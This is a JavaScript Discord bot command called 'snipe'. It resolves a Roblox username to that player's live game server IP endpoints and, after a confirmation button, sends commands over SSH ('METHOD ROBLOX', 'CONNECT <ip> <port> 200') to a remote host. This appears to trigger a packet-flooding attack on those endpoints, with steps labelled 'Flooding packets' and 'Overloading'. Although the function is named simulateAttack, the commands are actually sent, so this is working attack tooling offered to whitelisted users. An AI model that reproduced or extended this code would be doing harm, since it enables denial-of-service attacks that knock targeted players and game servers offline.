const { SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const { getUserIdFromUsername, getServerInfo } = require("../utils/roblox");
const { Client } = require("ssh2");
const axios = require("axios");

const WHITELIST = process.env.WHITELIST?.split(",").map(id => id.trim()) || [];

async function getUserAvatar(userId) {
  try {
    const res = await axios.get(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
    return res.data.data[0]?.imageUrl || null;
  } catch {
    return null;
  }
}

async function sendSSHCommand(conn, command) {
  return new Promise((resolve, reject) => {
    conn.exec(command, (err, stream) => {
      if (err) return reject(err);

      let output = '';
      stream.on('close', () => resolve(output))
            .on('data', data => output += data.toString())
            .stderr.on('data', data => output += data.toString());
    });
  });
}

async function simulateAttack(interaction, username, endpoints) {
  const steps = [
    {
      text: ip => `- Routing traffic through **${ip}**...`,
      img: "https://cdn.discordapp.com/attachments/1324040777239892029/1412800438696284270/Step_1.png",
      command: "METHOD ROBLOX" // first SSH command
    },
    {
      text: ip => `- Flooding packets to **${ip}**...`,
      img: "https://cdn.discordapp.com/attachments/1255971728656437449/1268628872396669048/Step_2_1.png",
      command: (ip) => `CONNECT ${ip} ${ip.Port} 200` // second SSH command with IP
    },
    {
      text: ip => `- Overloading **${ip}**...`,
      img: "https://cdn.discordapp.com/attachments/1255971728656437449/1268675160081170665/Step_3_1.png",
      command: null // no command
    },
  ];

  const embed = new EmbedBuilder().setFooter({ text: "SEEYUH!" }).setTimestamp();

  const ssh = new Client();
  await new Promise((resolve, reject) => {
    ssh.on('ready', resolve).connect({
      host: process.env.SSH_HOST,
      port: Number(process.env.SSH_PORT) || 22,
      username: process.env.SSH_USER,
      password: process.env.SSH_PASS 
    });
  });

  for (const ip of endpoints) {
    for (const step of steps) {

      embed.setDescription(`## <a:loading:1412806608626385058> | Attacking ${username}\n${step.text(ip)}`).setImage(step.img);
      await interaction.editReply({ embeds: [embed], ephemeral: true }).catch(() => {});
      await new Promise(r => setTimeout(r, 6000));


      if (step.command) {
        const cmd = typeof step.command === "function" ? step.command(ip) : step.command;
        try {
          const output = await sendSSHCommand(ssh, cmd);
          console.log(`[SSH OUTPUT] ${cmd}: ${output}`);
        } catch (err) {
          console.log(`[SSH ERROR] ${cmd}: ${err.message}`);
        }
      }
    }
  }

  ssh.end();
}

module.exports = {
  data: new SlashCommandBuilder()
    .setName("snipe")
    .setDescription("Fetch Roblox server info and simulate attack.")
    .addStringOption(opt =>
      opt.setName("username")
        .setDescription("Roblox username")
        .setRequired(true)
    ),

  async execute(interaction) {
    const username = interaction.options.getString("username");

    if (!WHITELIST.includes(interaction.user.id)) {
      return interaction.reply({ content: "> <:exclamation_mark_red:1412806644752191499> | You are not whitelisted.", ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });

    const userId = await getUserIdFromUsername(username);
    if (!userId) {
      return interaction.editReply({
        embeds: [new EmbedBuilder().setColor("Red").setDescription("<:exclamation_mark_red:1412806644752191499> | User not found or API error")],
        ephemeral: true
      });
    }

    const serverInfo = await getServerInfo(userId);
    if (serverInfo.error) {
      return interaction.editReply({
        embeds: [new EmbedBuilder().setColor("Red").setDescription(`<:exclamation_mark_red:1412806644752191499> | ${serverInfo.error}`)],
        ephemeral: true
      });
    }

    const avatar = await getUserAvatar(userId);

    // Build endpoint display
    let endpointList = [];
    let endpointDisplay = [];
    if (serverInfo.Test.UdmuxEndpoints?.length) {
      endpointList = serverInfo.Test.UdmuxEndpoints.map(u => `${u.Address}:${u.Port}`);
      endpointDisplay = endpointList.map(ep => `\`\`\`${ep} (UDMUX)\`\`\``);
    } else if (serverInfo.Test.ServerConnections?.length) {
      endpointList = serverInfo.Test.ServerConnections.map(c => `${c.Address}:${c.Port}`);
      endpointDisplay = endpointList.map(ep => `\`\`\`${ep} (Fallback)\`\`\``);
    } else {
      const errorEmbed = new EmbedBuilder()
        .setColor("Red")
        .setDescription(`<:exclamation_mark_red:1412806644752191499> | Could not find any valid endpoints for **${username}**.`)
        .setFooter({ text: "SEEYUH!" })
        .setTimestamp();
      return interaction.editReply({ embeds: [errorEmbed], ephemeral: true });
    }

    // Confirmation embed
    const confirmEmbed = new EmbedBuilder()
      .setThumbnail(avatar)
      .setDescription(
        `## <:search:1412806504708309084> | Found **${username}**'s Server\n` +
        `> - Are you sure you want to attack **${username}**?\n` +
        `**Place ID:**\n\`\`\`${serverInfo.placeId}\`\`\`\n` +
        `**Job ID:**\n\`\`\`${serverInfo.jobId}\`\`\`\n` +
        `**Endpoints:**\n${endpointDisplay.join("\n")}`
      )
      .setFooter({ text: "SEEYUH!" })
      .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId("confirm_attack")
        .setLabel("Confirm") 
        .setEmoji('<:check_mark_green:1412801523712262365>')
        .setStyle(ButtonStyle.Secondary),
      new ButtonBuilder()
        .setCustomId("cancel_attack")
        .setLabel("Cancel")
        .setEmoji('<:x_red:1412806549386039406>')
        .setStyle(ButtonStyle.Secondary),
      new ButtonBuilder()
        .setLabel("Join Server")
        .setStyle(ButtonStyle.Link)
        .setEmoji(':link:1412811060695535709>')
        .setURL(`https://www.roblox.com/games/start?placeId=${serverInfo.placeId}&gameInstanceId=${serverInfo.jobId}`)
    );

    await interaction.editReply({ embeds: [confirmEmbed], components: [row], ephemeral: true });

    const collector = interaction.channel.createMessageComponentCollector({
      time: 30000,
      filter: i => i.user.id === interaction.user.id
    });

    collector.on("collect", async i => {
      if (i.customId === "confirm_attack") {
        await i.update({
          embeds: [new EmbedBuilder().setDescription(`## <a:loading:1412806608626385058> | Sniping ${username}\nStarting attack...`).setFooter({ text: "SEEYUH!" }).setTimestamp()],
          components: [],
          ephemeral: true
        });
        collector.stop();

        await simulateAttack(interaction, username, endpointList);

        const finalEndpointDisplay = endpointList.map(ep => {
          if (serverInfo.Test.UdmuxEndpoints?.length) return `\`\`\`${ep} (UDMUX)\`\`\``;
          if (serverInfo.Test.ServerConnections?.length) return `\`\`\`${ep} (Fallback)\`\`\``;
          return ep;
        });

        const finalEmbed = new EmbedBuilder()
          .setColor("Green")
          .setDescription(`## <:check_mark_green:1412801523712262365> | Everything is Done\nSuccessfully attacked **${username}**'s server\n\n-# Please contact technical support if you encounter any problems!`)
          .addFields(
            { name: "Job ID", value: `\`\`\`${serverInfo.jobId}\`\`\``, inline: false },
            { name: "UDMUX / Endpoints", value: finalEndpointDisplay.join("\n"), inline: false }
          )
          .setImage("https://media.discordapp.net/attachments/1255971728656437449/1268899921436606558/Step_4.png")
          .setFooter({ text: "SEEYUH!" })
          .setTimestamp();

        await interaction.editReply({ embeds: [finalEmbed], ephemeral: true });

      } else if (i.customId === "cancel_attack") {
        await i.update({ content: "> <:exclamation_mark_red:1412806644752191499> | Attack cancelled.", embeds: [], components: [], ephemeral: true });
        collector.stop();
      }
    });

    collector.on("end", async collected => {
      if (!collected.size) {
        await interaction.editReply({ content: "> <:clock:1412812154481938543> | Confirmation timed out.", embeds: [], components: [], ephemeral: true });
      }
    });
  },
};
